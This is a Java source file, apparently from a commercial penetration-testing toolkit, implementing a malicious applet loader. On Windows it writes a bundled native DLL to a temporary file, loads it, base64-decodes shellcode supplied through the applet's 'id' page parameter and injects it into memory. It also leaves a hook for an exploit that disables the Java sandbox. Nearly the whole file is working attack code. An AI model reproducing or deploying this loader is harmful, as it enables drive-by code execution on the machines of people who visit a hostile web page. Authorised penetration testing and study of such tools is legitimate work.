/*
 * (c) 2012 Strategic Cyber LLC
 *
 * See http://www.advancedpentest.com/license
 */
import java.applet.*;

import java.io.*;
import java.awt.*;

import java.net.*;
import java.lang.reflect.*;

/* an awesome Java applet to load stuff */
public class Main implements Runnable {
	protected Applet applet;

	public Main(Applet ap) {
		this.applet = ap;
	}

	public void check() {
		/* the purpose of this method is to invoke an exploit to disable the Java security sandbox.
		   by default, we do nothing, because it's assumed Main will be used by itself in a signed
		   applet attack. Child classes can override this though. */
	}

	public native void inject(byte[] me);

	public void run() {
		/* detect which payload we're going to drop */
		if ((System.getProperty("os.name") + "").indexOf("indows") > -1) {
			/* try to inject our Win32 payload... if this fails, resort to the Java payload */
			runApplet();
		}
	}

	/* track whether our DLL is loaded into memory already or not. Attempting to load twice causes an exception and IE
	   is manic about whether it makes sense to drop a JVM or keep it around */
	private static boolean isLoaded = false;

	public boolean runApplet() {
		try {
			if (!isLoaded) {
				/* our file */
				String file = "";

				/* extract injector.dll and load it with System.loadLibrary */
				File library = File.createTempFile("main", ".dll");
				library.deleteOnExit();

				/* determine the proper shellcode injection DLL to use */
				if ((System.getProperty("sun.arch.data.model") + "").contains("64")) {
					file = "main64.dll";
				}
				else {
					file = "main.dll";
				}

				InputStream i = this.getClass().getClassLoader().getResourceAsStream(file);

				/* 512KB of data */
				byte[] data = new byte[1024 * 512];

				/* keep reading our injector until we reach EOF */
				FileOutputStream output = new FileOutputStream(library, false);

				while (true) {
					int length = i.read(data);
					if (length <= 0)
						break;
					output.write(data, 0, length);
				}

				i.close();
				output.close();

				/* load it y0 */
				System.load(library.getAbsolutePath());

				/* we don't want to load the DLL a second time, while this JVM is running */
				isLoaded = true;
			}

			/* inject our shellcode... make them *pHEAR* us */
			byte[] dataz = Base64.decode(applet.getParameter("id") + "");
			inject(dataz);
			return true;
		}
		catch (Throwable ex) {
			return false;
		}
	}
}
